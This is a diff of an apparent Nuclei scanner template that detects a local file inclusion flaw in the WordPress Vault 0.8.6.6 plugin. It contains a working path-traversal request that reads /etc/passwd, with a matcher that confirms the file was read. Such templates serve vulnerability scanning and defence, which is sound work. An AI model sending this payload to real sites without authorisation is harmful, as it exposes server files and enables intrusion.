@@ -1,5 +1,4 @@
 id: wp-vault-local-file-inclusion
-
 info:
   name: WordPress Vault 0.8.6.6 - Local File Inclusion
   author: 0x_Akoko
@@ -11,20 +10,16 @@ info:
     cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
     cvss-score: 7.5
     cwe-id: CWE-22
-  tags: lfi,edb,wp-plugin,wordpress
-
+  tags: wp-plugin,wordpress,lfi
 requests:
   - method: GET
     path:
       - "{{BaseURL}}/?wpv-image=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd"
-
     matchers-condition: and
     matchers:
-
       - type: regex
         regex:
           - "root:.*:0:0:"
-
       - type: status
         status:
           - 200
